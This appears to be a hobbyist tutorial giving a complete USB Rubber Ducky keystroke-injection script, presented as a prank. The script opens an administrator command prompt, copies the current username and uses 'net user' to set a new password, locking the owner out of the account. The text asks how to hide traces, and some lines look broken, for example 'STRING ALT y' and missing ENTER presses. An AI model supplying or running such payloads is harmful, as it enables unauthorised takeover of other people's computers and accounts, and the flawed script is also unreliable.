Note: This hack works only if The user is signed in as administrator.

**Windows Prank:**

What the Duck here does, is that it opens up an Administrative command prompt, copies the user-name of the administrator using the command 
_echo %username% |clip_ and then hits enter.
Flawless as this attack maybe, it still leaves a trace as we copy the username. Let me know if any of you guys know how to "uncopy" i.e. remove this trace from the computer. Maybe some registry editing?? That, I don't know. Anyways, once the duck copies the username, it types out _net user *_

Now it moves one space back and then does SHIFT+INSERT, doing which pastes the copied username and also hits enter for you.

Now it types out whatever pass you want twice, hitting enter between the two times it types out the new pass.

Finally using exit command, it closes the command prompt. That is pretty much it. Have fun pranking your friends real hard.

The ducky code:(replace the word "_pass_" with the password you want. Just remember it, incase your friend finds out it was you!!)

REM Adjust the delays according to how slow or fast your victim's computer is.

DELAY 200

GUI r

DELAY 200

STRING cmd

DELAY 200

CTRL SHIFT ENTER

DELAY 200

STRING ALT y

DELAY 200

STRING echo %username% |clip

DELAY 200

STRING net user *

DELAY 200

LEFTARROW

DELAY 200

SHIFT INSERT

DELAY 200

STRING pass

DELAY 200

STRING pass

DELAY 200

STRING exit

DELAY 200

ENTER

REM Execution Complete!!
